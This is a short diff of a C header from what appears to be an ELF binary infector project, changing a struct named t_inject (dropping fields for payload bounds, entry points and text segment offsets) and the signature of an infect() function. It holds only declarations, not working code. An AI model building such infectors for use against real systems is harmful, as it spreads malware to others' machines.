@@ -25,14 +25,7 @@ typedef struct s_arg_data
 typedef struct s_inject
 {
 	Elf64_Ehdr *header;
-	Elf64_Phdr *seg;
-	Elf64_Addr init_entry_point;
-	Elf64_Off new_entry_point;
-	Elf64_Addr first_seg;
-	Elf64_Addr start_payload;
-	Elf64_Addr end_payload;
-	Elf64_Off text_size;
-	Elf64_Off text_off;
+    Elf64_Addr *entry_point;
 
 } t_inject;
 
@@ -53,6 +46,6 @@ void read_dir(t_arg_data *data, char *path);
 bool parse_file(char *path, char *file_name, t_file *file, t_arg_data *data);
 
 /* infect.c */
-void infect(t_file *file);
+void infect(t_file *file, t_arg_data *data);
 
 #endif
